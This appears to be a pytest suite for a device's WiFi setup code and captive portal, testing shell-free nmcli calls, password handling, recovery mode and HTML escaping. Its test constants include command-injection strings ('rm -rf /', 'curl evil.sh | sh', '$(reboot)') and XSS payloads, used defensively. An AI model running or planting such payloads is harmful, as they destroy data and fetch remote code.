"""WiFi setup security + recovery: connect_saved_wifi and the captive portal.

No Pi, network or nmcli needed: subprocess/nmcli is replaced by a fake that
records every argv, and the portal's AP / WiFi calls are monkeypatched.
"""
import json
import socket
import types

import pytest

import connect_saved_wifi as csw

MALICIOUS_SSID = "Home'; rm -rf / #$(reboot)`id`"
MALICIOUS_PASSWORD = "pw\" && curl evil.sh | sh; echo '$(id)'"


def nm_escape(value):
    """Escape a value the way `nmcli -t` does"""
    return value.replace('\\', '\\\\').replace(':', '\\:')


class FakeNM:
    """Minimal NetworkManager stand-in that answers the nmcli argv we send"""

    def __init__(self, profiles=None, correct=None, connected_ssid=None, active=None):
        self.profiles = dict(profiles or {})   # profile name -> SSID
        self.psk = {}                          # profile name -> stored password
        self.correct = correct or {}           # SSID -> password the router accepts
        self.connected_ssid = connected_ssid
        self.active = active                   # profile name active on wlan0
        self.calls = []

    def __call__(self, argv, timeout=30):
        assert isinstance(argv, list), "commands must be argv lists"
        assert all(isinstance(a, str) for a in argv)
        self.calls.append(list(argv))
        args = argv[1:] if argv[0] == 'sudo' else argv
        if args[:5] == ['nmcli', '-t', '-f', 'DEVICE,STATE', 'device']:
            state = 'connected' if self.connected_ssid else 'disconnected'
            return True, f"wlan0:{state}\nlo:unmanaged\n", ""
        if args[:4] == ['nmcli', '-t', '-f', 'ACTIVE,SSID']:
            lines = [f"yes:{nm_escape(self.connected_ssid)}"] if self.connected_ssid else []
            lines.append("no:SomeoneElse")
            return True, "\n".join(lines) + "\n", ""
        if args[:6] == ['nmcli', '-t', '-f', 'NAME,TYPE', 'connection', 'show']:
            out = "".join(f"{nm_escape(n)}:802-11-wireless\n" for n in self.profiles)
            return True, out + "Wired connection 1:802-3-ethernet\n", ""
        if args[:6] == ['nmcli', '-t', '-f', 'NAME,DEVICE', 'connection', 'show']:
            assert args[6:] == ['--active']
            out = f"{nm_escape(self.active)}:wlan0\n" if self.connected_ssid and self.active else ""
            return True, out + "lo:lo\n", ""
        if args[:4] == ['nmcli', '-s', '-g', '802-11-wireless-security.psk']:
            name = args[-1]
            if name not in self.profiles:
                return False, "", "no such connection"
            return True, nm_escape(self.psk.get(name, '')) + "\n", ""
        if args[:4] == ['nmcli', '-t', '-f', '802-11-wireless.ssid']:
            name = args[-1]
            if name not in self.profiles:
                return False, "", "no such connection"
            return True, f"802-11-wireless.ssid:{nm_escape(self.profiles[name])}\n", ""
        if args[:3] == ['nmcli', 'connection', 'modify']:
            self.psk[args[4]] = args[6]
            return True, "", ""
        if args[:3] == ['nmcli', 'connection', 'up']:
            name = args[4]
            ssid = self.profiles.get(name)
            if ssid is not None and self.correct.get(ssid) == self.psk.get(name):
                self.connected_ssid = ssid
                self.active = name
                return True, "", ""
            self.connected_ssid = self.active = None   # Activation tears the old one down
            return False, "", "Secrets were required"
        if args[:4] == ['nmcli', 'device', 'wifi', 'connect']:
            ssid, password = args[4], args[6]
            if self.correct.get(ssid) == password:
                self.profiles[ssid] = ssid
                self.psk[ssid] = password
                self.connected_ssid = ssid
                self.active = ssid
                return True, "", ""
            return False, "", "Secrets were required"
        return True, "", ""


def no_sleep(_s):
    return None


def no_probe(_host, _port):
    return None


# ============================================
# argv building / no shell
# ============================================

@pytest.mark.parametrize('module_name', ['connect_saved_wifi', 'wifi_manager',
                                         'captive_portal', 'leeloo_boot'])
def test_wifi_modules_never_use_shell(module_name):
    import ast
    import importlib.util
    path = importlib.util.find_spec(module_name).origin
    tree = ast.parse(open(path).read())
    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            for kw in node.keywords:
                assert kw.arg != 'shell', f"{module_name}:{node.lineno} passes shell="
            func = node.func
            name = getattr(func, 'attr', getattr(func, 'id', ''))
            assert name not in ('system', 'popen', 'getoutput', 'getstatusoutput'), \
                f"{module_name}:{node.lineno} runs a shell command"


def test_run_cmd_passes_argv_without_shell(monkeypatch):
    seen = {}

    def fake_run(argv, **kwargs):
        seen['argv'] = argv
        seen['kwargs'] = kwargs
        return types.SimpleNamespace(returncode=0, stdout="ok", stderr="")

    monkeypatch.setattr(csw.subprocess, 'run', fake_run)
    argv = csw.build_connect_argv(MALICIOUS_SSID, MALICIOUS_PASSWORD)
    ok, out, _ = csw.run_cmd(argv)
    assert ok and out == "ok"
    assert seen['argv'] == argv
    assert not seen['kwargs'].get('shell', False)


def test_run_cmd_errors_never_echo_the_password(monkeypatch):
    import subprocess

    def timeout_run(argv, **kwargs):
        raise subprocess.TimeoutExpired(argv, 30)

    monkeypatch.setattr(csw.subprocess, 'run', timeout_run)
    ok, _, err = csw.run_cmd(csw.build_connect_argv('Home', 'sup3r-secret'))
    assert not ok and 'sup3r-secret' not in err

    def missing_run(argv, **kwargs):
        raise FileNotFoundError(2, 'No such file or directory', argv[0])

    monkeypatch.setattr(csw.subprocess, 'run', missing_run)
    ok, _, err = csw.run_cmd(csw.build_connect_argv('Home', 'sup3r-secret'))
    assert not ok and 'sup3r-secret' not in err


def test_run_cmd_refuses_shell_strings():
    with pytest.raises(TypeError):
        csw.run_cmd("nmcli dev wifi connect 'x'")


def test_connect_argv_keeps_values_literal():
    argv = csw.build_connect_argv(MALICIOUS_SSID, MALICIOUS_PASSWORD)
    assert argv == ['sudo', 'nmcli', 'device', 'wifi', 'connect', MALICIOUS_SSID,
                    'password', MALICIOUS_PASSWORD, 'ifname', 'wlan0']
    assert csw.build_set_psk_argv('My:Net', MALICIOUS_PASSWORD)[-1] == MALICIOUS_PASSWORD
    assert csw.build_profile_up_argv(MALICIOUS_SSID)[5] == MALICIOUS_SSID


def test_new_network_connect_passes_malicious_values_as_single_items():
    nm = FakeNM(correct={MALICIOUS_SSID: MALICIOUS_PASSWORD})
    assert csw.connect_with_networkmanager(MALICIOUS_SSID, MALICIOUS_PASSWORD,
                                           run=nm, sleep=no_sleep, wait_s=3)
    connect_calls = [c for c in nm.calls if 'connect' in c]
    assert connect_calls == [csw.build_connect_argv(MALICIOUS_SSID, MALICIOUS_PASSWORD)]
    # The password appears only as its own argv item, never inside another one
    for call in nm.calls:
        for item in call:
            assert item == MALICIOUS_PASSWORD or MALICIOUS_PASSWORD not in item


def test_wrong_password_reports_failure():
    nm = FakeNM(correct={'Home': 'right-password'})
    assert not csw.connect_with_networkmanager('Home', 'wrong', run=nm,
                                               sleep=no_sleep, wait_s=3)


def test_existing_profile_gets_new_password_and_no_duplicate_profile():
    nm = FakeNM(profiles={'netplan-wlan0-Home': 'Home'}, correct={'Home': 'new-pass'})
    nm.psk['netplan-wlan0-Home'] = 'old-pass'
    assert csw.connect_with_networkmanager('Home', 'new-pass', run=nm,
                                           sleep=no_sleep, wait_s=3)
    assert ['sudo', 'nmcli', 'connection', 'modify', 'id', 'netplan-wlan0-Home',
            'wifi-sec.psk', 'new-pass'] in nm.calls
    assert not any('connect' in c and 'wifi' in c for c in nm.calls)


def test_rescans_when_network_not_in_scan_list_yet():
    nm = FakeNM(correct={'Home': 'pw'})
    inner = nm.__call__
    state = {'scanned': False}

    def run(argv, timeout=30):
        if 'rescan' in argv:
            state['scanned'] = True
        if 'connect' in argv and not state['scanned']:
            nm.calls.append(list(argv))
            return False, "", "Error: No network with SSID 'Home' found."
        return inner(argv, timeout)

    sleeps = []
    assert csw.connect_with_networkmanager('Home', 'pw', run=run, sleep=sleeps.append, wait_s=3)
    assert sum(1 for c in nm.calls if 'connect' in c) == 2
    assert csw.RESCAN_WAIT_S in sleeps


def test_wrong_password_is_not_retried_as_scan_problem():
    calls = []

    def run(argv, timeout=30):
        calls.append(argv)
        return False, "", "Error: Connection activation failed: Secrets were required"

    result = csw.run_with_rescan(['nmcli', 'x'], run=run, sleep=no_sleep)
    assert result[0] is False and len(calls) == 1


def test_existing_profile_failure_does_not_create_another_profile():
    nm = FakeNM(profiles={'Home': 'Home'}, correct={'Home': 'right'})
    assert not csw.connect_with_networkmanager('Home', 'wrong', run=nm,
                                               sleep=no_sleep, wait_s=2)
    assert not any(c[1:5] == ['nmcli', 'device', 'wifi', 'connect'] for c in nm.calls)


# ============================================
# Exact SSID matching + nmcli escaping
# ============================================

def test_split_nmcli_terse_unescapes():
    assert csw.split_nmcli_terse(r"My\:Net:802-11-wireless") == ['My:Net', '802-11-wireless']
    assert csw.split_nmcli_terse(r"back\\slash:x") == ['back\\slash', 'x']
    assert csw.split_nmcli_terse("yes:") == ['yes', '']


def test_profile_lookup_is_exact_not_substring():
    nm = FakeNM(profiles={'HomeGuest': 'HomeGuest', 'Home 2': 'MyHome'})
    assert csw.find_profiles_for_ssid('Home', run=nm) == []
    nm.profiles['Home'] = 'Home'
    assert csw.find_profiles_for_ssid('Home', run=nm) == ['Home']
    assert csw.find_profiles_for_ssid('HomeGuest', run=nm) == ['HomeGuest']


def test_profile_lookup_handles_escaped_colons():
    nm = FakeNM(profiles={'Cafe:Wifi profile': 'Cafe:Wifi', 'Cafe': 'Cafe'})
    assert csw.find_profiles_for_ssid('Cafe:Wifi', run=nm) == ['Cafe:Wifi profile']
    assert csw.find_profiles_for_ssid('Cafe', run=nm) == ['Cafe']
    # The lookup asked nmcli about the real (unescaped) profile name
    assert ['nmcli', '-t', '-f', '802-11-wireless.ssid', 'connection', 'show', 'id',
            'Cafe:Wifi profile'] in nm.calls


def test_connected_check_is_exact():
    nm = FakeNM(connected_ssid='HomeGuest')
    assert not csw.is_connected_to('Home', run=nm)
    assert csw.is_connected_to('HomeGuest', run=nm)
    nm.connected_ssid = 'Lab:5G'
    assert csw.get_wlan0_ssid(run=nm) == 'Lab:5G'
    assert csw.is_connected_to('Lab:5G', run=nm)


def test_connected_check_needs_wlan0_connected_state():
    def run(argv, timeout=30):
        if 'DEVICE,STATE' in argv:
            return True, "wlan0:connecting (getting IP configuration)\n", ""
        return True, "yes:Home\n", ""
    assert csw.get_wlan0_ssid(run=run) is None


# ============================================
# Typed password must really be the one in use
# ============================================

class FakeClock:
    """clock()/sleep() pair: sleeping advances the clock instantly"""

    def __init__(self):
        self.now = 0.0

    def clock(self):
        return self.now

    def sleep(self, seconds):
        self.now += seconds


def test_parse_profile_psk_unescapes():
    assert csw.parse_profile_psk('pa\\:ss\\\\word\n') == 'pa:ss\\word'
    assert csw.parse_profile_psk('\n') is None
    assert csw.parse_profile_psk('') is None


def test_parse_active_wlan_profile():
    out = 'lo:lo\nCafe\\:Wifi:wlan0\nWired:eth0\n'
    assert csw.parse_active_wlan_profile(out) == 'Cafe:Wifi'
    assert csw.parse_active_wlan_profile('lo:lo\n') is None


def test_get_psk_argv_is_literal():
    assert csw.build_get_psk_argv(MALICIOUS_SSID) == [
        'sudo', 'nmcli', '-s', '-g', '802-11-wireless-security.psk',
        'connection', 'show', 'id', MALICIOUS_SSID]


def test_already_connected_with_same_password_takes_shortcut():
    nm = FakeNM(profiles={'Home': 'Home'}, correct={'Home': 'pa:ss'},
                connected_ssid='Home', active='Home')
    nm.psk['Home'] = 'pa:ss'
    assert csw.connect_with_networkmanager('Home', 'pa:ss', run=nm, sleep=no_sleep, wait_s=3)
    assert not any(c[1:4] == ['nmcli', 'connection', 'modify'] for c in nm.calls)
    assert not any(c[1:4] == ['nmcli', 'connection', 'up'] for c in nm.calls)


def test_already_connected_with_other_password_is_not_trusted():
    """Autoconnect of the old profile won the race: the typo must not count as working"""
    nm = FakeNM(profiles={'Home': 'Home'}, correct={'Home': 'right'},
                connected_ssid='Home', active='Home')
    nm.psk['Home'] = 'right'
    assert not csw.connect_with_networkmanager('Home', 'typo', run=nm, sleep=no_sleep, wait_s=3)
    # The typo was tried on the real profile...
    assert ['sudo', 'nmcli', 'connection', 'modify', 'id', 'Home', 'wifi-sec.psk', 'typo'] in nm.calls
    # ...then the working password was put back and the device went back online
    assert nm.psk['Home'] == 'right'
    assert nm.connected_ssid == 'Home' and nm.active == 'Home'


def test_already_connected_new_password_that_works_is_confirmed():
    nm = FakeNM(profiles={'Home': 'Home'}, correct={'Home': 'new-pass'},
                connected_ssid='Home', active='Home')
    nm.psk['Home'] = 'old-pass'
    assert csw.connect_with_networkmanager('Home', 'new-pass', run=nm, sleep=no_sleep, wait_s=3)
    assert nm.psk['Home'] == 'new-pass'


def test_wrong_password_restores_working_profile_password():
    nm = FakeNM(profiles={'netplan-wlan0-Home': 'Home'}, correct={'Home': 'right'})
    nm.psk['netplan-wlan0-Home'] = 'right'
    assert not csw.connect_with_networkmanager('Home', 'wrong', run=nm, sleep=no_sleep, wait_s=2)
    assert nm.psk['netplan-wlan0-Home'] == 'right'
    # Wasn't online before, so no extra reconnect attempt
    ups = [c for c in nm.calls if c[1:4] == ['nmcli', 'connection', 'up']]
    assert len(ups) == 1


def test_duplicate_profile_autoconnect_does_not_confirm_typed_password():
    nm = FakeNM(profiles={'Home': 'Home', 'Home 1': 'Home'}, correct={'Home': 'right'})
    nm.psk.update({'Home': 'right', 'Home 1': 'right'})

    def run(argv, timeout=30):
        result = nm(argv, timeout)
        if argv[1:4] == ['nmcli', 'connection', 'up'] and not result[0]:
            # NM falls back to the other saved profile for the same SSID
            nm.connected_ssid, nm.active = 'Home', 'Home 1'
        return result

    assert not csw.connect_with_networkmanager('Home', 'typo', run=run, sleep=no_sleep, wait_s=3)
    assert nm.psk['Home'] == 'right'


def test_connect_respects_timeout_budget():
    fc = FakeClock()
    nm = FakeNM(correct={'Home': 'right'})
    assert not csw.connect_with_networkmanager('Home', 'wrong', run=nm, sleep=fc.sleep,
                                               wait_s=30, timeout_s=12, clock=fc.clock)
    assert fc.now <= 13


def test_rescans_stop_at_deadline():
    fc = FakeClock()
    calls = []

    def run(argv, timeout=30):
        calls.append(argv)
        return False, "", "Error: No network with SSID 'Home' found."

    result = csw.run_with_rescan(['nmcli', 'connect'], run=run, sleep=fc.sleep,
                                 deadline=3, clock=fc.clock)
    assert result[0] is False
    assert calls == [['nmcli', 'connect']]   # No rescan: it wouldn't finish in time


def test_default_runner_caps_nmcli_timeouts_to_budget(monkeypatch):
    fc = FakeClock()
    timeouts = []

    def fake_run_cmd(argv, timeout=30):
        timeouts.append(timeout)
        fc.now += 1
        return False, "", "failed"

    monkeypatch.setattr(csw, 'run_cmd', fake_run_cmd)
    assert not csw.connect_with_networkmanager('Home', 'pw', sleep=fc.sleep, wait_s=60,
                                               timeout_s=12, clock=fc.clock)
    assert timeouts and max(timeouts) <= 12 and min(timeouts) >= 5
    assert fc.now <= 20


def test_switch_to_wifi_passes_timeout(monkeypatch):
    seen = {}
    monkeypatch.setattr(csw, 'stop_ap_mode', lambda: None)
    monkeypatch.setattr(csw, 'connect_with_networkmanager',
                        lambda ssid, password, timeout_s=None: seen.update(t=timeout_s) or True)
    assert csw.switch_to_wifi('Home', 'pw', timeout_s=99)
    assert seen['t'] == 99


# ============================================
# Captive portal
# ============================================

class InlineThread:
    """threading.Thread stand-in that runs the target synchronously"""

    def __init__(self, target=None, args=(), kwargs=None, **_ignored):
        self._target, self._args, self._kwargs = target, args, kwargs or {}

    def start(self):
        self._target(*self._args, **self._kwargs)


@pytest.fixture
def portal(tmp_path, monkeypatch):
    import captive_portal as cp

    monkeypatch.setattr(cp, 'DEVICE_CONFIG_PATH', str(tmp_path / 'device_config.json'))
    monkeypatch.setattr(cp, 'CREW_CONFIG_PATH', str(tmp_path / 'crew_config.json'))
    monkeypatch.setattr(cp, 'FINISH_RESPONSE_GRACE_S', 0)
    monkeypatch.setattr(cp, 'PORTAL_POLL_S', 0.001)
    monkeypatch.setattr(cp, 'threading', types.SimpleNamespace(Thread=InlineThread))
    monkeypatch.setattr(cp, '_device_crew_code', 'LEELOO-TEST')

    env = types.SimpleNamespace(cp=cp, lcd=[], ap_starts=0, wifi_results=[], wifi_calls=[],
                                restores=0)

    def fake_switch(ssid, password):
        env.wifi_calls.append((ssid, password))
        return env.wifi_results.pop(0) if env.wifi_results else False

    def fake_start_ap():
        env.ap_starts += 1
        return 'LEE-AB12'

    def fake_restore():
        env.restores += 1

    monkeypatch.setattr(cp, 'switch_to_wifi', fake_switch)
    monkeypatch.setattr(cp, 'start_ap_mode', fake_start_ap)
    monkeypatch.setattr(cp, 'release_wlan0_for_ap', lambda: None)
    monkeypatch.setattr(cp, 'scan_wifi_networks', lambda: ['Home', '<img src=x onerror=alert(1)>'])
    monkeypatch.setattr(cp, 'restore_client_mode', fake_restore)
    cp.set_lcd_callback(lambda screen, **kw: env.lcd.append((screen, kw)))
    cp.reset_portal_state()
    env.client = cp.app.test_client()
    env.config = lambda: json.load(open(cp.DEVICE_CONFIG_PATH))
    yield env
    cp.set_lcd_callback(None)
    cp.reset_portal_state()


def fill_first_run(env, ssid='Home', password='right-password'):
    c = env.client
    r = c.post('/api/wifi', json={'ssid': ssid, 'password': password})
    assert r.get_json() == {'success': True, 'next': '/setup/you'}
    assert c.post('/api/info', json={'user_name': 'Nat', 'zip_code': '27601'}).get_json()['success']
    assert c.post('/api/crew/create', json={'crew_code': 'LEELOO-TEST'}).get_json()['success']
    assert c.post('/api/telegram-optin', json={'telegram_opted_in': True}).get_json()['success']


def test_finish_success_marks_complete_only_after_connect(portal):
    fill_first_run(portal)
    assert portal.config().get('setup_complete') is None  # Not before the attempt

    portal.wifi_results = [True]
    r = portal.client.post('/api/finish')
    assert r.status_code == 200 and r.get_json()['status'] == 'connecting'

    cfg = portal.config()
    assert cfg['setup_complete'] is True
    assert cfg['wifi_ssid'] == 'Home' and cfg['user_name'] == 'Nat'
    assert portal.wifi_calls == [('Home', 'right-password')]
    assert portal.cp._setup_done.is_set()
    assert [s for s, _ in portal.lcd] == ['connecting', 'success']


def test_wrong_password_keeps_setup_incomplete_and_brings_ap_back(portal):
    fill_first_run(portal, password='wrong')
    portal.wifi_results = [False]
    portal.client.post('/api/finish')

    cfg = portal.config()
    assert cfg['setup_complete'] is False
    assert cfg['user_name'] == 'Nat' and cfg['zip_code'] == '27601'
    assert json.load(open(portal.cp.CREW_CONFIG_PATH))['invite_code'] == 'LEELOO-TEST'
    assert portal.ap_starts == 1
    assert not portal.cp._setup_done.is_set()
    screen, kw = portal.lcd[-1]
    assert screen == 'wifi_failed' and kw['ap_ssid'] == 'LEE-AB12' and kw['ssid'] == 'Home'

    # The WiFi page shows the error (twice: captive browsers load it more than once)
    for _ in range(2):
        assert b'could not connect to Home' in portal.client.get('/setup/wifi').data

    # New password is accepted and skips straight to the finish step
    r = portal.client.post('/api/wifi', json={'ssid': 'Home', 'password': 'right-password'})
    assert r.get_json() == {'success': True, 'next': '/setup/done'}
    portal.wifi_results = [True]
    portal.client.post('/api/finish')
    assert portal.config()['setup_complete'] is True
    assert portal.config()['wifi_password'] == 'right-password'


def test_switch_exception_counts_as_failure(portal, monkeypatch):
    fill_first_run(portal)

    def boom(ssid, password):
        raise OSError("nmcli exploded")

    monkeypatch.setattr(portal.cp, 'switch_to_wifi', boom)
    portal.client.post('/api/finish')
    assert portal.config()['setup_complete'] is False
    assert portal.ap_starts == 1


def test_error_message_is_html_escaped(portal):
    evil = '<script>alert(1)</script>'
    fill_first_run(portal, ssid=evil)
    portal.wifi_results = [False]
    portal.client.post('/api/finish')
    page = portal.client.get('/setup/wifi').data.decode()
    assert evil not in page
    assert '&lt;script&gt;alert(1)&lt;/script&gt;' in page


def test_posts_rejected_after_setup_complete(portal):
    fill_first_run(portal)
    portal.wifi_results = [True]
    portal.client.post('/api/finish')

    # Same session: finished
    r = portal.client.post('/api/wifi', json={'ssid': 'Evil', 'password': 'x'})
    assert r.status_code == 409

    # Any later portal session on a set-up device (not recovery)
    portal.cp.reset_portal_state()
    for path, body in [('/api/wifi', {'ssid': 'Evil', 'password': 'pw'}),
                       ('/api/info', {'user_name': 'Eve', 'zip_code': '12345'}),
                       ('/api/crew/join', {'invite_code': 'LEELOO-EVIL'}),
                       ('/api/telegram-optin', {'telegram_opted_in': False}),
                       ('/api/finish', None)]:
        r = portal.client.post(path, json=body)
        assert r.status_code == 403, path
    assert portal.config()['wifi_ssid'] == 'Home'
    assert portal.config()['user_name'] == 'Nat'
    # Pages still render (GET is harmless)
    assert portal.client.get('/setup/wifi').status_code == 200


def test_recovery_mode_is_wifi_only_and_keeps_old_wifi_until_confirmed(portal):
    fill_first_run(portal, ssid='OldNet', password='old-pass')
    portal.wifi_results = [True]
    portal.client.post('/api/finish')
    portal.cp.reset_portal_state(recovery=True)

    assert portal.client.post('/api/info', json={'user_name': 'Eve', 'zip_code': '12345'}).status_code == 403
    r = portal.client.post('/api/wifi', json={'ssid': 'NewNet', 'password': 'bad'})
    assert r.get_json() == {'success': True, 'next': '/setup/done'}
    assert portal.config()['wifi_ssid'] == 'OldNet'  # Not replaced yet

    portal.wifi_results = [False]
    portal.client.post('/api/finish')
    cfg = portal.config()
    assert cfg['setup_complete'] is True and cfg['wifi_ssid'] == 'OldNet'
    assert cfg['wifi_password'] == 'old-pass'
    assert portal.lcd[-1][0] == 'wifi_failed'

    portal.client.post('/api/wifi', json={'ssid': 'NewNet', 'password': 'good'})
    portal.wifi_results = [True]
    portal.client.post('/api/finish')
    cfg = portal.config()
    assert cfg['wifi_ssid'] == 'NewNet' and cfg['wifi_password'] == 'good'
    assert cfg['user_name'] == 'Nat'


def test_stale_finish_after_failure_does_not_retry_bad_password(portal):
    fill_first_run(portal, password='wrong')
    portal.wifi_results = [False]
    portal.client.post('/api/finish')
    assert portal.cp.setup_state['pending_password'] is None
    assert portal.ap_starts == 1

    # A stale /setup/done tab reloads after the phone rejoins LEE-XXXX
    r = portal.client.post('/api/finish')
    assert r.status_code == 409 and r.get_json()['retry'] is True
    assert portal.wifi_calls == [('Home', 'wrong')]   # No second attempt
    assert portal.ap_starts == 1                      # AP stayed up
    assert portal.lcd[-1][0] == 'wifi_failed'

    # The done page sends the user back to the WiFi page on that reply
    done_page = portal.client.get('/setup/done').data.decode()
    assert 'd.retry' in done_page and "'/setup/wifi'" in done_page

    # New password: finish works again
    portal.client.post('/api/wifi', json={'ssid': 'Home', 'password': 'right-password'})
    portal.wifi_results = [True]
    assert portal.client.post('/api/finish').status_code == 200
    assert portal.wifi_calls[-1] == ('Home', 'right-password')
    assert portal.config()['setup_complete'] is True


def test_stale_finish_after_failure_refused_in_recovery(portal):
    portal.cp.save_device_config({'wifi_ssid': 'Old', 'wifi_password': 'old',
                                  'setup_complete': True})
    portal.cp.reset_portal_state(recovery=True)
    portal.client.post('/api/wifi', json={'ssid': 'New', 'password': 'bad'})
    portal.wifi_results = [False]
    portal.client.post('/api/finish')
    r = portal.client.post('/api/finish')
    assert r.status_code == 409 and r.get_json()['retry'] is True
    assert portal.wifi_calls == [('New', 'bad')]


def test_finish_while_connecting_does_not_start_second_attempt(portal):
    fill_first_run(portal)
    portal.cp.setup_state['connecting'] = True
    r = portal.client.post('/api/finish')
    assert r.get_json()['status'] == 'connecting'
    assert portal.wifi_calls == []
    # And new credentials are refused mid-attempt
    assert portal.client.post('/api/wifi', json={'ssid': 'X', 'password': 'y'}).status_code == 409


def test_api_wifi_bad_input_does_not_crash(portal):
    assert portal.client.post('/api/wifi', data='not json').get_json()['success'] is False
    assert portal.client.post('/api/wifi', json={'ssid': ['x'], 'password': 1}).get_json()['success'] is False
    assert portal.client.post('/api/wifi', json={'ssid': 'x' * 33, 'password': 'p'}).get_json()['success'] is False


def test_served_pages_never_build_html_from_strings(portal):
    pages = ['/setup/wifi', '/setup/you', '/setup/crew', '/setup/crew/create',
             '/setup/crew/join', '/setup/telegram', '/setup/spotify', '/setup/done']
    for page in pages:
        body = portal.client.get(page).data.decode()
        assert 'innerHTML' not in body, page
    wifi_page = portal.client.get('/setup/wifi').data.decode()
    assert "document.createElement('option')" in wifi_page
    assert 'opt.textContent' in wifi_page and 'opt.value' in wifi_page
    # Hostile SSIDs only travel as JSON data
    nets = portal.client.get('/api/networks').get_json()['networks']
    assert '<img src=x onerror=alert(1)>' in nets


def test_check_post_allowed_rules():
    import captive_portal as cp
    base = {'recovery': False, 'connecting': False, 'finished': False, 'closed': False}
    assert cp.check_post_allowed('/api/info', False, base)[0]
    assert cp.check_post_allowed('/api/info', True, base)[:2] == (False, 403)
    rec = dict(base, recovery=True)
    assert cp.check_post_allowed('/api/wifi', True, rec)[0]
    assert cp.check_post_allowed('/api/finish', True, rec)[0]
    assert cp.check_post_allowed('/api/crew/join', True, rec)[:2] == (False, 403)
    assert cp.check_post_allowed('/api/wifi', False, dict(base, finished=True))[:2] == (False, 409)
    assert cp.check_post_allowed('/api/finish', True, dict(rec, closed=True))[:2] == (False, 409)


def test_portal_window_expired():
    import captive_portal as cp
    assert not cp.portal_window_expired(1000, 0, None, False)       # first run: never
    assert not cp.portal_window_expired(599, 0, 600, False)
    assert cp.portal_window_expired(600, 0, 600, False)
    assert not cp.portal_window_expired(10_000, 0, 600, True)       # attempt running


# ============================================
# Portal server lifetime
# ============================================

class FakeServer:
    def __init__(self, host, port):
        self.host, self.port = host, port
        self.shutdown_called = False
        self.closed = False

    def shutdown(self):
        self.shutdown_called = True

    def server_close(self):
        self.closed = True

    def serve_forever(self):
        pass


def test_server_binds_ap_ip_with_retry():
    import captive_portal as cp
    attempts = []

    def factory(host, port, app, threaded):
        attempts.append(host)
        assert threaded is True and app is cp.app
        if len(attempts) < 3:
            raise OSError(99, "Cannot assign requested address")
        return FakeServer(host, port)

    server = cp.create_portal_server(80, server_factory=factory, sleep=no_sleep,
                                     bind_probe=no_probe)
    assert server.host == cp.AP_IP == '192.168.4.1'
    assert attempts == [cp.AP_IP] * 3


def test_server_falls_back_to_all_interfaces():
    import captive_portal as cp

    def factory(host, port, app, threaded):
        if host != '0.0.0.0':
            raise OSError(99, "Cannot assign requested address")
        return FakeServer(host, port)

    server = cp.create_portal_server(80, retries=4, server_factory=factory, sleep=no_sleep,
                                     bind_probe=no_probe)
    assert server.host == '0.0.0.0'


def test_server_permission_error_propagates():
    import captive_portal as cp

    def factory(host, port, app, threaded):
        raise AssertionError("must not get this far")

    def probe(host, port):
        raise PermissionError(13, "Permission denied")

    with pytest.raises(PermissionError):
        cp.create_portal_server(80, server_factory=factory, sleep=no_sleep, bind_probe=probe)


def test_server_probe_failure_retries_before_building_server():
    import captive_portal as cp
    probes, built = [], []

    def probe(host, port):
        probes.append(host)
        if len(probes) < 3:
            raise OSError(99, "Cannot assign requested address")

    def factory(host, port, app, threaded):
        built.append(host)
        return FakeServer(host, port)

    server = cp.create_portal_server(80, server_factory=factory, sleep=no_sleep, bind_probe=probe)
    assert server.host == cp.AP_IP and built == [cp.AP_IP]
    assert probes == [cp.AP_IP] * 3


def test_server_factory_sys_exit_becomes_oserror():
    """werkzeug >= 2.3 calls sys.exit(1) on bind errors; we must still retry/fall back"""
    import captive_portal as cp
    attempts = []

    def factory(host, port, app, threaded):
        attempts.append(host)
        if host != '0.0.0.0':
            raise SystemExit(1)
        return FakeServer(host, port)

    server = cp.create_portal_server(80, retries=2, server_factory=factory, sleep=no_sleep,
                                     bind_probe=no_probe)
    assert server.host == '0.0.0.0'
    assert attempts == [cp.AP_IP, cp.AP_IP, '0.0.0.0']


def test_real_werkzeug_unassigned_address_retries_then_falls_back():
    """Real make_server: 192.0.2.1 (TEST-NET) is never on this host"""
    import captive_portal as cp
    sleeps = []
    server = cp.create_portal_server(0, host='192.0.2.1', retries=2, sleep=sleeps.append)
    try:
        assert sleeps == [1.0, 1.0]
        assert server.host == '0.0.0.0' and server.server_port > 0
    finally:
        server.server_close()


def _busy_port():
    blocker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    blocker.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    blocker.bind(('127.0.0.1', 0))
    blocker.listen(1)
    return blocker, blocker.getsockname()[1]


def test_real_werkzeug_port_in_use_raises_oserror_not_systemexit():
    import captive_portal as cp
    blocker, port = _busy_port()
    sleeps = []
    try:
        with pytest.raises(OSError):
            cp.create_portal_server(port, host='127.0.0.1', retries=2, sleep=sleeps.append)
        assert sleeps == [1.0, 1.0]   # Retried, then the 0.0.0.0 fallback failed too
        # Even if the port gets taken between our probe and werkzeug's own bind
        with pytest.raises(OSError):
            cp.create_portal_server(port, host='127.0.0.1', retries=1, sleep=no_sleep,
                                    bind_probe=no_probe)
    finally:
        blocker.close()


def test_recovery_loop_survives_portal_bind_failure():
    """A busy port must not exit the boot process: recovery goes on to retry saved WiFi"""
    import captive_portal as cp
    import leeloo_boot as boot
    blocker, port = _busy_port()
    events = []

    def run_portal():
        events.append('portal')
        cp.create_portal_server(port, host='127.0.0.1', retries=1, sleep=no_sleep)
        return True

    try:
        result = boot.wifi_recovery_loop(run_portal, lambda: events.append('retry') or True,
                                         sleep=lambda s: None, max_rounds=1)
    finally:
        blocker.close()
    assert result == 'saved' and events == ['portal', 'retry']


def test_run_portal_shuts_server_down_after_success(portal, monkeypatch):
    cp = portal.cp
    servers = []

    def fake_start_server(port=80, host=None):
        server = FakeServer(cp.AP_IP, 80)
        servers.append(server)
        # Simulate the phone finishing setup with a good password
        cp.save_device_config({'wifi_ssid': 'Home', 'wifi_password': 'pw'})
        portal.wifi_results = [True]
        portal.client.post('/api/finish')
        return server

    monkeypatch.setattr(cp, 'start_portal_server', fake_start_server)
    lcd = []
    assert cp.run_captive_portal(lcd_update_callback=lambda s, **k: lcd.append(s)) is True
    assert servers[0].shutdown_called and servers[0].closed
    assert portal.restores == 0
    assert lcd[0] == 'ap_mode' and lcd[-1] == 'success'
    assert portal.config()['setup_complete'] is True


def test_recovery_portal_gives_up_after_window(portal, monkeypatch):
    cp = portal.cp
    servers = []
    now = [0.0]

    def fake_clock():
        now[0] += 120.0
        return now[0]

    monkeypatch.setattr(cp, '_clock', fake_clock)
    monkeypatch.setattr(cp, 'start_portal_server',
                        lambda port=80, host=None: servers.append(FakeServer(host, port)) or servers[-1])
